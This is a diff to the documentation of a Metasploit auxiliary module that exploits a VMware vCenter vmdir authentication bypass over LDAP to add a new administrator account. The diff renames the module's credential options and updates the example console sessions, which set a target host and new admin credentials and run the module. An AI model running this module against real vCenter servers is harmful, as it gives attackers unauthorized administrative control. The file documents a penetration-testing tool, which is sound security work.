@@ -32,21 +32,21 @@ Add an admin user to the vCenter Server.
 If you already have the LDAP base DN, you may set it in this option.
 `dc=vsphere,dc=local` will be used if not set.
 
-### BIND_DN
+### USERNAME
 
 If you already have a password to authenticate to the LDAP server (see
-BIND_PW), this option let you setup the bind username in DN format (e.g
+USERNAME), this option let you setup the bind username in DN format (e.g
 `cn=1.2.3.4,ou=Domain Controllers,dc=vsphere,dc=local`).
 
-### BIND_PW
+### PASSWORD
 
 The password to authenticate to the LDAP server, if you have it.
 
-### USERNAME
+### NEW_USERNAME
 
 Set this to the username for the new admin user.
 
-### PASSWORD
+### NEW_PASSWORD
 
 Set this to the password for the new admin user.
 
@@ -63,11 +63,11 @@ Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    BASE_DN                    no        LDAP base DN if you already have it
-   PASSWORD                   no        Password of admin user to add
+   NEW_PASSWORD               no        Password of admin user to add
    RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT     636              yes       The target port
    SSL       true             no        Enable SSL on the LDAP connection
-   USERNAME                   no        Username of admin user to add
+   NEW_USERNAME               no        Username of admin user to add
 
 
 Auxiliary action:
@@ -79,10 +79,10 @@ Auxiliary action:
 
 msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set rhosts [redacted]
 rhosts => [redacted]
-msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set username msfadmin
-username => msfadmin
-msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set password msfadmin
-password => msfadmin
+msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set new_username msfadmin
+new_username => msfadmin
+msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > set new_password msfadmin
+new_password => msfadmin
 msf5 auxiliary(admin/ldap/vmware_vcenter_vmdir_auth_bypass) > run
 [*] Running module against [redacted]
 not verifying SSL hostname of LDAPS server '[redacted]:636'
@@ -140,15 +140,15 @@ Module options (auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass):
    Name      Current Setting                         Required  Description
    ----      ---------------                         --------  -----------
    BASE_DN   dc=vsphere,dc=local                     no        LDAP base DN if you already have it
-   BIND_DN   cn=192.168.3.32,ou=Domain Controlle     no        The username to authenticate to LDAP server
+   USERNAME  cn=192.168.3.32,ou=Domain Controlle     no        The username to authenticate to LDAP server
              rs,dc=vsphere,dc=local
-   BIND_PW   #$F4!4SeV\BL~L2gb(oa                    no        Password for the BIND_DN
-   PASSWORD  NewPassword123#                         no        Password of admin user to add
+   PASSWORD  #$F4!4SeV\BL~L2gb(oa                    no        Password for the BIND_DN
+   NEW_PASSWORD  NewPassword123#                     no        Password of admin user to add
    RHOSTS    192.168.3.32                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                /wiki/Using-Metasploit
    RPORT     636                                     yes       The target port
    SSL       true                                    no        Enable SSL on the LDAP connection
-   USERNAME  MsfAdmin                                no        Username of admin user to add
+   NEW_USERNAME  MsfAdmin                            no        Username of admin user to add
 
 
 Auxiliary action:
